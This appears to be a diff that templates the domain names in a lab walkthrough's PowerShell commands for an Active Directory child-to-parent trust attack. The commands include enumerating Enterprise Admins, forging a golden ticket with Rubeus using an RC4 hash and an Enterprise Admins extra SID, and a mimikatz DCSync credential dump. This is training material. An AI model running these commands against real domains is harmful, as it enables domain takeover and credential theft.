@@ -21,13 +21,13 @@ Get-DomainSID
 ## 3. `powershell` _(output omitted)_
 
 ```powershell
-Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
+Get-DomainGroup -Domain {{DOMAIN_UPPER}} -Identity "Enterprise Admins" | select distinguishedname,objectsid
 ```
 
 ## 4. `powershell` _(output omitted)_
 
 ```powershell
-ls \\academy-ea-dc01.inlanefreight.local\c$
+ls \\academy-ea-dc01.{{DOMAIN}}\c$
 ```
 
 ## 5. `powershell` _(output omitted)_
@@ -45,19 +45,19 @@ klist
 ## 7. `powershell` _(output omitted)_
 
 ```powershell
-ls \\academy-ea-dc01.inlanefreight.local\c$
+ls \\academy-ea-dc01.{{DOMAIN}}\c$
 ```
 
 ## 8. `powershell` _(output omitted)_
 
 ```powershell
-ls \\academy-ea-dc01.inlanefreight.local\c$
+ls \\academy-ea-dc01.{{DOMAIN}}\c$
 ```
 
 ## 9. `powershell` _(output omitted)_
 
 ```powershell
- .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
+ .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.{{DOMAIN_UPPER}} /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
 ```
 
 ## 10. `powershell` _(output omitted)_
@@ -75,11 +75,11 @@ klist
 ## 12. `powershell`
 
 ```powershell
-mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
+mimikatz # lsadump::dcsync /user:{{DOMAIN_NB}}\lab_adm /domain:{{DOMAIN_UPPER}}
 
-[DC] 'INLANEFREIGHT.LOCAL' will be the domain
-[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
-[DC] 'INLANEFREIGHT\lab_adm' will be the user account
+[DC] '{{DOMAIN_UPPER}}' will be the domain
+[DC] 'ACADEMY-EA-DC01.{{DOMAIN_UPPER}}' will be the DC server
+[DC] '{{DOMAIN_NB}}\lab_adm' will be the user account
 [rpc] Service  : ldap
 [rpc] AuthnSvc : GSS_NEGOTIATE (9)
 
